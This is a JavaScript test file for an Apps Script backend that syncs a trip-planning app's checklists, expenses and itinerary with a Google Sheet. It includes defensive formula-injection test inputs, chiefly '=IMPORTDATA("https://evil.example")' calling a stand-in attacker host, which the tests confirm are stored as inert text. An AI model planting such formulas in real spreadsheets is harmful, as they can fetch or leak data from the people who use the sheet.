/* Code.gs against stubbed Apps Script services (HANDOFF §12 L2, stubbed). */
suite('server', function () {
  function pt(d, t) { return BT.time.zonedToInstant(d, t || '00:00', 'America/Los_Angeles'); }
  function tabs(mutate) {
    var raw = FIXTURES.sheet();
    var out = {};
    Object.keys(raw).forEach(function (k) { out[k] = { values: raw[k].values }; });
    out.Hotels.displayOverride = { 1: { 12: '11112222333344445' } };
    out._SyncLog = { values: [['opId', 'Received at', 'Device', 'Type', 'Entity ID', 'Result', 'Reason']] };
    if (mutate) mutate(out);
    return out;
  }
  function snap() { return STUB.post({ token: STUB.token(), action: 'snapshot', device: 'test', appVersion: '0.1.0' }); }
  function idCol(tab) { return STUB.sheets[tab].rows.slice(1).map(function (r) { return r[0]; }); }

  test('not JSON → BAD_REQUEST', function () {
    STUB.reset(tabs());
    var r = STUB.post('{oops');
    eq(r.ok, false); eq(r.api, 1); eq(r.code, 'BAD_REQUEST');
  });

  test('EC-26: missing or wrong token → AUTH, and the reply never echoes the token', function () {
    STUB.reset(tabs());
    eq(STUB.post({ action: 'snapshot' }).code, 'AUTH');
    var r = STUB.post({ token: STUB.token() + 'x', action: 'snapshot' });
    eq(r.code, 'AUTH');
    ok(JSON.stringify(r).indexOf(STUB.token()) < 0);
    STUB.reset(tabs(), { ENV: 'staging' });                     // no token configured at all
    eq(STUB.post({ token: '', action: 'snapshot' }).code, 'AUTH');
  });

  test('unknown action and GET → BAD_REQUEST', function () {
    STUB.reset(tabs());
    eq(STUB.post({ token: STUB.token(), action: 'drop tables' }).code, 'BAD_REQUEST');
    eq(JSON.parse(doGet().content).code, 'BAD_REQUEST');
  });

  test('ping echoes Japanese and emoji (EC-15) and reports env', function () {
    STUB.reset(tabs());
    var r = STUB.post({ token: STUB.token(), action: 'ping', echo: '日本語 🍣' });
    eq(r.ok, true); eq(r.env, 'staging'); eq(r.echo, '日本語 🍣');
  });

  test('snapshot: response shape (HANDOFF §6)', function () {
    STUB.reset(tabs());
    var r = snap();
    eq(r.ok, true); eq(r.api, 1); eq(r.serverVersion, '0.2.2'); eq(r.env, 'staging');
    ok(/^[0-9a-f]{16}$/.test(r.rev), 'rev hex');
    ok(!isNaN(Date.parse(r.generatedAt)));
    deepEq(Object.keys(r.data).sort(), ['checklists', 'expenses', 'hotels', 'ideas', 'itinerary', 'phrases', 'settings', 'transportation']);
    ok(Array.isArray(r.issues));
    eq(STUB.lockReleased, 1, 'lock released');
  });

  test('EC-16: rows without IDs get one; blank rows and existing IDs are left alone; one write per tab', function () {
    STUB.reset(tabs(function (t) {
      t.Itinerary.values[2][0] = '';
      t.Itinerary.values[6][0] = '';
      t.Checklists.values[1][0] = '';
    }));
    snap();
    var ids = idCol('Itinerary');
    ok(/^it_[a-z2-9]{6}$/.test(ids[1]), 'new itinerary id: ' + ids[1]);
    ok(/^it_[a-z2-9]{6}$/.test(ids[5]));
    eq(ids[0], 'it_a1', 'existing id untouched');
    eq(ids[4], '', 'blank row stays blank');
    ok(/^ck_/.test(idCol('Checklists')[0]));
    eq(idCol('Checklists')[1], '', 'blank checklist row (FALSE checkbox) gets no ID');
    eq(STUB.writes.length, 3, 'one write per missing ID, nothing else');
    eq(STUB.writes.filter(function (w) { return w.col !== 1 || w.n !== 1; }).length, 0, 'only single ID cells are written');
  });

  test('EC-16: a second snapshot assigns nothing new and returns the same rev', function () {
    STUB.reset(tabs(function (t) { t.Itinerary.values[2][0] = ''; }));
    var a = snap();
    var before = idCol('Itinerary').join();
    STUB.writes = [];
    var b = snap();
    eq(STUB.writes.length, 0);
    eq(idCol('Itinerary').join(), before);
    eq(a.rev, b.rev);
  });

  test('EC-10: IDs move with their rows when rows are sorted', function () {
    STUB.reset(tabs(function (t) { t.Itinerary.values[2][0] = ''; }));
    snap();
    var rows = STUB.sheets.Itinerary.rows;
    var landId = rows[2][0];
    var header = rows.shift(); rows.reverse(); rows.unshift(header);    // Lindsay sorts the tab
    var r = snap();
    var land = r.data.itinerary.filter(function (x) { return x.title === 'Land and train to the hotel'; })[0];
    eq(land.id, landId);
  });

  test('rev changes when the data changes', function () {
    STUB.reset(tabs());
    var a = snap().rev;
    STUB.sheets.Itinerary.rows[1][11] = 'new note';
    ok(snap().rev !== a);
  });

  test('EC-17: a second snapshot during ensureIds is refused; every ID is written under the lock, once', function () {
    STUB.reset(tabs(function (t) {
      t.Itinerary.values[2][0] = '';
      t.Itinerary.values[6][0] = '';
      t.Itinerary.values[7][0] = '';
    }));
    var nested = null;
    STUB.onWrite = function () {
      if (nested) return;
      nested = snap();           // a second phone syncs while the first is assigning IDs
    };
    var r = snap();
    ok(r.ok, 'the first snapshot succeeds');
    eq(nested.code, 'LOCK_TIMEOUT', 'the concurrent one waits out the lock');
    eq(STUB.writes.length, 3, 'one write per missing ID, none from the second call');
    eq(STUB.writes.filter(function (w) { return !w.locked; }).length, 0, 'every write happened under the lock');
    eq(STUB.lockHeld, false, 'lock released');
    var ids = idCol('Itinerary').filter(Boolean);
    eq(Object.keys(ids.reduce(function (m, id) { m[id] = 1; return m; }, {})).length, ids.length, 'IDs are unique');
    STUB.onWrite = null;
    STUB.writes = [];
    snap();
    eq(STUB.writes.length, 0, 'the retry assigns nothing new');
  });

  test('EC-13: merged cells read as blank except the first; formula results read as values; no crash', function () {
    STUB.reset(tabs(function (t) {
      t.Itinerary.values[4][1] = '';            // Date merged down from the row above: only the first cell has it
      t.Itinerary.values[2][13] = 1000;         // a formula's result arrives as its value
    }));
    var r = snap();
    ok(r.ok, 'snapshot still succeeds');
    var titles = r.data.itinerary.map(function (x) { return x.title; });
    ok(titles.indexOf('Fake market') >= 0, 'the first row of the merge keeps its date');
    ok(titles.indexOf('Fake lunch') < 0, 'the blank-date row is hidden, not guessed');
    var v03 = r.issues.filter(function (i) { return i.id === 'V-03' && i.row === 5; })[0];
    ok(v03 && /Date/.test(v03.message), 'reported as V-03 on row 5 naming Date');
    eq(r.data.itinerary.filter(function (x) { return x.title === 'Land and train to the hotel'; })[0].estCost, 1000);
    eq(idCol('Itinerary')[3], 'it_a4', 'the hidden row keeps its ID');
  });

  test('busy lock → LOCK_TIMEOUT, nothing written', function () {
    STUB.reset(tabs(function (t) { t.Itinerary.values[2][0] = ''; }));
    STUB.lockBusy = true;
    var r = snap();
    eq(r.code, 'LOCK_TIMEOUT');
    eq(STUB.writes.length, 0);
  });

  test('Date cells: calendar dates, timestamps and time-only cells', function () {
    STUB.reset(tabs(function (t) {
      t.Itinerary.values[2][1] = pt('2026-11-19');                          // date cell
      t.Itinerary.values[2][2] = new Date(1899, 11, 30, 16, 55);            // time-only cell…
      t.Itinerary.values[2][17] = new Date('2026-10-14T20:15:00Z');         // timestamp
      t.Itinerary.displayOverride = { 2: { 2: '4:55:00 PM' } };             // …read via its display text
    }));
    var r = snap();
    var land = r.data.itinerary.filter(function (x) { return x.id === 'it_a2'; })[0];
    eq(land.date, '2026-11-19');
    eq(land.time, '16:55');
    eq(land.updated, '2026-10-14T20:15:00.000Z');
  });

  test('17-digit confirmation stored as a number comes through as exact text', function () {
    STUB.reset(tabs());
    eq(snap().data.hotels[0].confirmation, '11112222333344445');
  });

  test('V-09: a missing tab is reported; the snapshot still succeeds', function () {
    STUB.reset(tabs(function (t) { delete t.Ideas; }));
    var r = snap();
    eq(r.ok, true);
    eq(r.data.ideas, null);
    ok(r.issues.some(function (i) { return i.id === 'V-09' && i.tab === 'Ideas'; }));
  });

  // ---------- mutate (HANDOFF §6) ----------
  var T0 = '2026-10-20T10:00:00.000Z';
  function at(min) { return new Date(Date.parse(T0) + min * 60000).toISOString(); }
  var seq = 0;
  function op(type, id, fields, when, opId) {
    return { opId: opId || 'op_test' + (++seq) + 'abcdef', type: type, id: id, fields: fields || {}, clientUpdatedAt: when || at(0) };
  }
  function mutate(ops) { return STUB.post({ token: STUB.token(), action: 'mutate', device: 'lindsay-iphone', appVersion: '0.2.0', ops: ops }); }
  function rowOf(tab, id) { return STUB.sheets[tab].rows.filter(function (r) { return r[0] === id; })[0]; }
  function cell(tab, id, header) { return rowOf(tab, id)[STUB.sheets[tab].rows[0].indexOf(header)]; }
  function logRows() { return STUB.sheets._SyncLog.rows.slice(1); }

  test('mutate: checklist.update ticks the row, fills Done by / Done at / Updated at, and logs it', function () {
    STUB.reset(tabs());
    var r = mutate([op('checklist.update', 'ck_1', { done: true, doneBy: 'Lindsay' }, at(1))]);
    eq(r.ok, true); eq(r.api, 1); eq(r.serverVersion, '0.2.2');
    eq(r.results.length, 1);
    eq(r.results[0].status, 'applied');
    eq(r.results[0].serverUpdatedAt, at(1));
    eq(cell('Checklists', 'ck_1', 'Done'), true);
    eq(cell('Checklists', 'ck_1', 'Done by'), 'Lindsay');
    eq(cell('Checklists', 'ck_1', 'Done at'), at(1));
    eq(cell('Checklists', 'ck_1', 'Updated at'), at(1));
    eq(logRows().length, 1);
    deepEq([logRows()[0][2], logRows()[0][3], logRows()[0][4], logRows()[0][5]], ['lindsay-iphone', 'checklist.update', 'ck_1', 'applied']);
    eq(STUB.writes.filter(function (w) { return !w.locked; }).length, 0, 'every write under the lock');
    eq(STUB.lockHeld, false);
    var item = snap().data.checklists.filter(function (c) { return c.id === 'ck_1'; })[0];
    eq(item.done, true, 'the next snapshot shows it');
    eq(item.doneBy, 'Lindsay');
  });

  test('idempotency: replaying an applied opId returns duplicate and writes nothing to the tab', function () {
    STUB.reset(tabs());
    var o = op('checklist.update', 'ck_1', { done: true }, at(1));
    mutate([o]);
    var before = JSON.stringify(STUB.sheets.Checklists.rows);
    var r = mutate([o]);
    eq(r.results[0].status, 'duplicate');
    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
    deepEq(logRows().map(function (l) { return l[5]; }), ['applied', 'duplicate']);
    eq(mutate([o, o]).results.map(function (x) { return x.status; }).join(), 'duplicate,duplicate', 'also within one batch');
  });

  test('last write wins by clientUpdatedAt: an older op is stale and changes nothing (AC-L2)', function () {
    STUB.reset(tabs());
    mutate([op('checklist.update', 'ck_1', { done: true }, at(5))]);
    var r = mutate([op('checklist.update', 'ck_1', { done: false }, at(3))]);
    eq(r.results[0].status, 'stale');
    eq(r.results[0].serverUpdatedAt, at(5));
    eq(cell('Checklists', 'ck_1', 'Done'), true, 'the newer toggle stays');
    eq(mutate([op('checklist.update', 'ck_1', { done: false }, at(5))]).results[0].status, 'stale', 'a tie keeps the stored edit');
    eq(mutate([op('checklist.update', 'ck_1', { done: false }, at(6))]).results[0].status, 'applied');
    eq(cell('Checklists', 'ck_1', 'Done'), false);
    eq(cell('Checklists', 'ck_1', 'Done at'), '', 'unticking clears Done at');
    eq(cell('Checklists', 'ck_1', 'Done by'), '');
  });

  test('checklist.add writes after the last real row (reusing the FALSE-checkbox row); a new op for the same ID updates it', function () {
    STUB.reset(tabs());
    var r = mutate([op('checklist.add', 'ck_new1', { list: 'Packing', item: 'Umbrella', owner: 'Both', bag: 'Suitcase', sort: 500 }, at(1))]);
    eq(r.results[0].status, 'applied');
    var rows = STUB.sheets.Checklists.rows;
    eq(rows[2][0], 'ck_new1', 'written on row 3, the first empty row');
    eq(cell('Checklists', 'ck_new1', 'Done'), false);
    eq(cell('Checklists', 'ck_new1', 'Deleted'), false);
    eq(cell('Checklists', 'ck_new1', 'Sort'), 500);
    mutate([op('checklist.add', 'ck_new2', { list: 'Packing', item: 'Hat' }, at(2))]);
    eq(rows[3][0], 'ck_new2', 'the next add goes below it');
    eq(mutate([op('checklist.add', 'ck_new1', { list: 'Packing', item: 'Big umbrella' }, at(3))]).results[0].status, 'applied');
    eq(cell('Checklists', 'ck_new1', 'Item'), 'Big umbrella');
    eq(rows.filter(function (x) { return x[0] === 'ck_new1'; }).length, 1, 'no duplicate row');
    ok(STUB.raw.some(function (w) { return w.tab === 'Checklists' && w.value === "'Umbrella"; }), 'item text sent with the text prefix');
    ok(STUB.raw.some(function (w) { return w.tab === 'Checklists' && w.value === 500; }), 'numbers stay numbers');
  });

  test('rows are found by ID even after someone sorts the tab', function () {
    STUB.reset(tabs(function (t) {
      t.Checklists.values.splice(1, 0, ['ck_2', 'Pre-trip', 'Other task', 'Jordan', '—', '', false, '', '', '', '', '', false]);
    }));
    var rows = STUB.sheets.Checklists.rows;
    var header = rows.shift(); rows.reverse(); rows.unshift(header);
    mutate([op('checklist.update', 'ck_1', { notes: 'moved' }, at(1))]);
    eq(cell('Checklists', 'ck_1', 'Notes'), 'moved');
    eq(cell('Checklists', 'ck_2', 'Notes'), '');
  });

  test('checklist.delete is soft: the row stays and Deleted is ticked', function () {
    STUB.reset(tabs());
    var n = STUB.sheets.Checklists.rows.length;
    eq(mutate([op('checklist.delete', 'ck_1', {}, at(1))]).results[0].status, 'applied');
    eq(STUB.sheets.Checklists.rows.length, n);
    eq(cell('Checklists', 'ck_1', 'Deleted'), true);
  });

  test('rejections: bad ops are refused one by one, with a reason, and write nothing to the tabs', function () {
    STUB.reset(tabs());
    var before = JSON.stringify(STUB.sheets.Checklists.rows);
    var far = new Date(Date.now() + 3 * 24 * 3600000).toISOString();
    var bad = [
      op('checklist.explode', 'ck_1', {}),
      op('checklist.update', 'ex_1', { done: true }),
      op('checklist.update', 'ck_1', { deleted: true }),
      op('checklist.update', 'ck_1', { owner: 'Bob' }),
      op('checklist.update', 'ck_1', { due: 'Nov 1' }),
      op('checklist.update', 'ck_1', { done: 'yes' }),
      op('checklist.update', 'ck_1', { done: true }, far),
      op('checklist.update', 'ck_nope', { done: true }),
      op('checklist.add', 'ck_new3', { list: 'Packing' }),
      { opId: 'bad id!', type: 'checklist.update', id: 'ck_1', fields: {}, clientUpdatedAt: at(1) },
      op('checklist.update', 'ck_1', { done: true }, 'yesterday')
    ];
    var r = mutate(bad);
    eq(r.ok, true);
    r.results.forEach(function (x, i) { eq(x.status, 'rejected', 'op ' + i); ok(x.reason, 'op ' + i + ' has a reason'); });
    ok(/clock/.test(r.results[6].reason));
    ok(/Not found/.test(r.results[7].reason));
    ok(/Missing item/.test(r.results[8].reason));
    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
  });

  test('_SyncLog stores client strings as text; non-string type or id is rejected, not a crash', function () {
    STUB.reset(tabs());
    var r = mutate([op('checklist.update', '=HYPERLINK("x")', { done: true }, at(1)), { opId: 'op_abcdefgh', type: ['x'], id: { a: 1 }, fields: {}, clientUpdatedAt: at(1) }]);
    eq(r.ok, true);
    deepEq(r.results.map(function (x) { return x.status; }), ['rejected', 'rejected']);
    eq(logRows()[0][4], '=HYPERLINK("x")');
    ok(STUB.raw.some(function (w) { return w.tab === '_SyncLog' && w.value === "'=HYPERLINK(\"x\")"; }), 'sent with the text prefix');
    ok(logRows().every(function (l) { return l.every(function (v) { return typeof v === 'string'; }); }), 'every log cell is text');
  });

  test('an edit can\'t blank a required column (Item, List)', function () {
    STUB.reset(tabs());
    var r = mutate([op('checklist.update', 'ck_1', { item: '' }, at(1)), op('checklist.update', 'ck_1', { list: '' }, at(2))]);
    eq(r.results[0].status, 'rejected'); ok(/Can't clear item/.test(r.results[0].reason));
    eq(r.results[1].status, 'rejected');
    eq(cell('Checklists', 'ck_1', 'Item'), 'Fake task');
  });

  test('a rejected op retried with the same opId is evaluated again, not treated as a duplicate', function () {
    STUB.reset(tabs(function (t) { t.Checklists.values[1][0] = 'ck_9'; }));
    var o = op('checklist.update', 'ck_1', { done: true }, at(1));
    eq(mutate([o]).results[0].status, 'rejected');
    STUB.sheets.Checklists.rows[1][0] = 'ck_1';             // someone restores the row in the sheet
    eq(mutate([o]).results[0].status, 'applied');
  });

  test('text that looks like a formula is stored as text, never run', function () {
    STUB.reset(tabs());
    mutate([op('checklist.update', 'ck_1', { notes: '=IMPORTDATA("https://evil.example")' }, at(1))]);
    eq(cell('Checklists', 'ck_1', 'Notes'), '=IMPORTDATA("https://evil.example")');
    var notesCol = STUB.sheets.Checklists.rows[0].indexOf('Notes') + 1;
    var sent = STUB.raw.filter(function (w) { return w.tab === 'Checklists' && w.col === notesCol; });
    eq(sent.length, 1);
    eq(sent[0].value, "'=IMPORTDATA(\"https://evil.example\")", 'sent to the sheet with the text prefix');
  });

  test('expense.upsert adds a row with device and createdAt; a later upsert edits it; delete is soft', function () {
    STUB.reset(tabs());
    var f = { tripDate: '2026-11-21', amount: 1200, currency: 'JPY', envelope: 'Daily', category: 'Food', method: 'Cash', paidBy: 'Lindsay', note: 'ramen', taxFree: false };
    eq(mutate([op('expense.upsert', 'ex_abc123', f, at(1))]).results[0].status, 'applied');
    eq(cell('Expenses', 'ex_abc123', 'Amount'), 1200);
    eq(cell('Expenses', 'ex_abc123', 'Device'), 'lindsay-iphone');
    eq(cell('Expenses', 'ex_abc123', 'Created at'), at(1));
    eq(mutate([op('expense.upsert', 'ex_abc123', { amount: 1300 }, at(2))]).results[0].status, 'applied');
    eq(cell('Expenses', 'ex_abc123', 'Amount'), 1300);
    eq(cell('Expenses', 'ex_abc123', 'Created at'), at(1), 'createdAt kept');
    eq(mutate([op('expense.upsert', 'ex_def456', { amount: 1.5, tripDate: '2026-11-21', currency: 'JPY', envelope: 'Daily', category: 'Food' }, at(2))]).results[0].status, 'rejected', 'yen are whole numbers');
    mutate([op('expense.delete', 'ex_abc123', {}, at(3))]);
    eq(cell('Expenses', 'ex_abc123', 'Deleted'), true);
    var e = snap().data.expenses.filter(function (x) { return x.id === 'ex_abc123'; })[0];
    eq(e.amount, 1300); eq(e.deleted, true);
  });

  test('EC-22: both phones log an expense in the same second: both rows are written', function () {
    STUB.reset(tabs());
    var f = { tripDate: '2026-11-21', amount: 1200, currency: 'JPY', envelope: 'Daily', category: 'Food', method: 'Cash', paidBy: 'Lindsay', note: 'ramen', taxFree: false };
    var a = STUB.post({ token: STUB.token(), action: 'mutate', device: 'lindsay-iphone', appVersion: '0.2.0', ops: [op('expense.upsert', 'ex_lin00001', f, at(1))] });
    var b = STUB.post({ token: STUB.token(), action: 'mutate', device: 'jordan-iphone', appVersion: '0.2.0',
      ops: [op('expense.upsert', 'ex_jor00001', Object.assign({}, f, { paidBy: 'Jordan', amount: 900 }), at(1))] });
    eq(a.results[0].status, 'applied'); eq(b.results[0].status, 'applied');
    eq(cell('Expenses', 'ex_lin00001', 'Device'), 'lindsay-iphone');
    eq(cell('Expenses', 'ex_jor00001', 'Device'), 'jordan-iphone');
    eq(cell('Expenses', 'ex_jor00001', 'Amount'), 900);
    eq(snap().data.expenses.filter(function (x) { return /^ex_(lin|jor)00001$/.test(x.id); }).length, 2);
  });

  test('EC-57: a live FX cell showing #N/A comes through as no rate; the fallback still arrives', function () {
    STUB.reset(tabs());
    var s = snap();
    eq(s.ok, true);
    eq(s.data.settings.fxLive, null);
    eq(s.data.settings.fxFallback, 158.3);
  });

  test('idea.add / idea.update and itinerary.setDone', function () {
    STUB.reset(tabs());
    eq(mutate([op('idea.add', 'id_abc123', { nameEn: 'Fake café', category: 'Café', city: 'Kyoto', status: 'Idea' }, at(1))]).results[0].status, 'applied');
    eq(mutate([op('idea.update', 'id_abc123', { status: 'Planned', plannedDate: '2026-11-22' }, at(2))]).results[0].status, 'applied');
    eq(cell('Ideas', 'id_abc123', 'Status'), 'Planned');
    eq(mutate([op('itinerary.setDone', 'it_a1', { done: true }, at(1))]).results[0].status, 'applied');
    eq(cell('Itinerary', 'it_a1', 'Done'), true);
    eq(cell('Itinerary', 'it_a1', 'Updated'), at(1));
    eq(mutate([op('itinerary.setDone', 'it_a1', { title: 'x' }, at(2))]).results[0].status, 'rejected', 'only Done can change');
  });

  test('v0.4 Nearby ops: idea.add with coordinates and who; "Put back" clears the planned day', function () {
    STUB.reset(tabs());
    var f = { nameEn: 'Fake here', category: 'Food', city: 'Osaka', status: 'Idea', lat: 34.6616, lng: 135.4968, source: 'Lindsay', addedBy: 'Lindsay', why: 'Fake why' };
    eq(mutate([op('idea.add', 'id_near01', f, at(1))]).results[0].status, 'applied');
    eq(cell('Ideas', 'id_near01', 'Lat'), 34.6616); eq(cell('Ideas', 'id_near01', 'Lng'), 135.4968);
    eq(cell('Ideas', 'id_near01', 'Source'), 'Lindsay'); eq(cell('Ideas', 'id_near01', 'Added by'), 'Lindsay');
    eq(mutate([op('idea.add', 'id_near02', { nameEn: 'x', lat: '34.6' }, at(1))]).results[0].status, 'rejected', 'coordinates are numbers');
    eq(mutate([op('idea.add', 'id_near03', { nameEn: 'x', source: 'Penny' }, at(1))]).results[0].status, 'rejected', 'source is a dropdown');
    mutate([op('idea.update', 'id_near01', { status: 'Planned', plannedDate: '2026-11-20' }, at(2))]);
    eq(mutate([op('idea.update', 'id_near01', { status: 'Idea', plannedDate: '' }, at(3))]).results[0].status, 'applied');
    eq(cell('Ideas', 'id_near01', 'Status'), 'Idea'); eq(cell('Ideas', 'id_near01', 'Planned date'), '');
    var i = snap().data.ideas.filter(function (x) { return x.id === 'id_near01'; })[0];
    eq(i.lat, 34.6616); eq(i.plannedDate, '');
  });

  test('About inserted after Title (as on the real sheet): read by header, and Done still writes the right cell', function () {
    STUB.reset(tabs(function (t) {
      var rows = t.Itinerary.values, last = rows[0].indexOf('About');
      rows.forEach(function (r) { if (r.length > last) r.splice(last, 1); });   // the fixture keeps About last; move it
      var after = rows[0].indexOf('Title') + 1;
      rows.forEach(function (r, n) { r.splice(after, 0, n === 0 ? 'About' : n === 1 ? 'Fake about' : ''); });
    }));
    var s = snap();
    eq(s.data.itinerary.filter(function (x) { return x.id === 'it_a1'; })[0].about, 'Fake about');
    eq(s.issues.filter(function (x) { return x.severity === 'error'; }).length, 0);
    eq(mutate([op('itinerary.setDone', 'it_a1', { done: true }, at(1))]).results[0].status, 'applied');
    eq(cell('Itinerary', 'it_a1', 'Done'), true);
    eq(cell('Itinerary', 'it_a1', 'About'), 'Fake about', 'About untouched');
  });

  // Ship-check 2026-10-21: a renamed header used to drop the value while reporting "applied".
  test('a renamed column: the op is refused naming the header, and nothing is written', function () {
    function renamed(from, to) {
      STUB.reset(tabs(function (t) { var h = t.Checklists.values[0]; h[h.indexOf(from)] = to; }));
    }
    renamed('Done', 'Done?');
    var r = mutate([op('checklist.update', 'ck_1', { done: true, doneBy: 'Jordan' }, at(1))]);
    eq(r.results[0].status, 'rejected');
    ok(/"Done"/.test(r.results[0].reason), r.results[0].reason);
    eq(cell('Checklists', 'ck_1', 'Done by'), '', 'Done by not written');
    eq(cell('Checklists', 'ck_1', 'Updated at'), '', 'Updated at not written');

    renamed('Item', 'Task');
    r = mutate([op('checklist.add', 'ck_new9', { list: 'Packing', item: 'Rail pass voucher' }, at(1))]);
    eq(r.results[0].status, 'rejected');
    ok(/"Item"/.test(r.results[0].reason), r.results[0].reason);
    ok(!STUB.sheets.Checklists.rows.some(function (row) { return row[0] === 'ck_new9'; }), 'no half-empty row added');

    renamed('Updated at', 'Last change');
    r = mutate([op('checklist.update', 'ck_1', { notes: 'x' }, at(1))]);
    eq(r.results[0].status, 'rejected', 'without Updated at, last-change-wins would be off');
    ok(/"Updated at"/.test(r.results[0].reason), r.results[0].reason);

    renamed('Deleted', 'Removed');
    eq(mutate([op('checklist.delete', 'ck_1', {}, at(1))]).results[0].status, 'rejected', 'delete needs the Deleted column');
  });

  test('a person sorting the tab between two ops: the second op still lands on its own row', function () {
    STUB.reset(tabs(function (t) {
      t.Checklists.values.splice(2, 0, ['ck_2', 'Pre-trip', 'Fake passport', 'Both', '—', '', false, '', '', '', '', '', false]);
    }));
    var moved = false;
    STUB.onSetValues = function (tab) {
      if (moved || tab !== 'Checklists') return;
      moved = true;                                   // swap rows 2 and 3, as a sort would
      var rows = STUB.sheets.Checklists.rows, a = rows[1]; rows[1] = rows[2]; rows[2] = a;
    };
    var r = mutate([op('checklist.update', 'ck_1', { notes: 'first' }, at(1)), op('checklist.update', 'ck_2', { notes: 'in the blue pouch' }, at(2))]);
    deepEq(r.results.map(function (x) { return x.status; }), ['applied', 'applied']);
    eq(cell('Checklists', 'ck_2', 'Notes'), 'in the blue pouch', 'on the passport row');
    eq(cell('Checklists', 'ck_1', 'Notes'), 'first', 'and the first change stayed whole on its own row');
    eq(cell('Checklists', 'ck_1', 'Updated at'), at(1));
    eq(cell('Checklists', 'ck_2', 'Updated at'), at(2));
  });

  test('a tick writes only its own cells: formulas and text around them are never rewritten', function () {
    STUB.reset(tabs(function (t) { t.Checklists.values[1][9] = '=1+1 typed as text'; }));
    STUB.raw = [];
    mutate([op('checklist.update', 'ck_1', { done: true, doneBy: 'Jordan' }, at(1))]);   // Done, Done by, Done at, Updated at
    var cols = STUB.raw.filter(function (w) { return w.tab === 'Checklists'; }).map(function (w) { return w.col; }).sort(function (a, b) { return a - b; });
    deepEq(cols, [7, 8, 9, 12], 'Notes (10) and Sort (11) untouched');
    eq(STUB.writes.filter(function (w) { return w.tab === 'Checklists'; }).length, 2, 'two calls: Done…Done at, then Updated at');
    eq(cell('Checklists', 'ck_1', 'Notes'), '=1+1 typed as text');
  });

  test('mutate: bad batches and a busy lock', function () {
    STUB.reset(tabs());
    eq(STUB.post({ token: STUB.token(), action: 'mutate', ops: 'nope' }).code, 'BAD_REQUEST');
    var many = []; for (var i = 0; i < 101; i++) many.push(op('checklist.update', 'ck_1', { done: true }, at(1)));
    eq(mutate(many).code, 'BAD_REQUEST');
    STUB.lockBusy = true;
    STUB.writes = [];
    eq(mutate([op('checklist.update', 'ck_1', { done: true }, at(1))]).code, 'LOCK_TIMEOUT');
    eq(STUB.writes.length, 0);
    eq(mutate([]).code, 'LOCK_TIMEOUT', 'still the lock, not a crash');
    STUB.lockBusy = false;
    eq(mutate([]).results.length, 0, 'an empty batch is fine');
  });

  test('a missing _SyncLog tab fails the whole call safely (INTERNAL), nothing written', function () {
    STUB.reset(tabs(function (t) { delete t._SyncLog; }));
    var before = JSON.stringify(STUB.sheets.Checklists.rows);
    eq(mutate([op('checklist.update', 'ck_1', { done: true }, at(1))]).code, 'INTERNAL');
    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
    eq(STUB.lockHeld, false);
  });

  test('resetStaging: refused in prod; in staging clears only test rows (ID with a capital T) and their log lines', function () {
    STUB.reset(tabs(), { API_TOKEN: 'test-token-0123456789-0123456789-abc', ENV: 'prod' });
    eq(STUB.post({ token: STUB.token(), action: 'resetStaging' }).code, 'AUTH');
    STUB.reset(tabs());
    mutate([op('checklist.add', 'ck_Tlive1', { list: 'Live test', item: 'one' }, at(1)),
      op('checklist.update', 'ck_1', { done: true }, at(1)),
      op('expense.upsert', 'ex_Tlive1', { tripDate: '2026-11-21', amount: 100, currency: 'JPY', envelope: 'Daily', category: 'Food' }, at(1))]);
    var r = STUB.post({ token: STUB.token(), action: 'resetStaging' });
    eq(r.ok, true);
    eq(r.cleared, 4, '2 test rows + 2 log lines');
    eq(rowOf('Checklists', 'ck_Tlive1'), undefined);
    eq(cell('Checklists', 'ck_1', 'Done'), true, 'real rows untouched');
    deepEq(logRows().filter(function (l) { return l[0]; }).map(function (l) { return l[4]; }), ['ck_1']);
  });

  test('unexpected failure → INTERNAL JSON, lock released', function () {
    STUB.reset(tabs());
    var real = SpreadsheetApp.getActive;
    SpreadsheetApp.getActive = function () { var ss = real(); ss.getSheetByName = function () { throw new Error('boom'); }; return ss; };
    try {
      var r = snap();
      eq(r.code, 'INTERNAL');
      eq(STUB.lockReleased, 1);
    } finally { SpreadsheetApp.getActive = real; }
  });
});
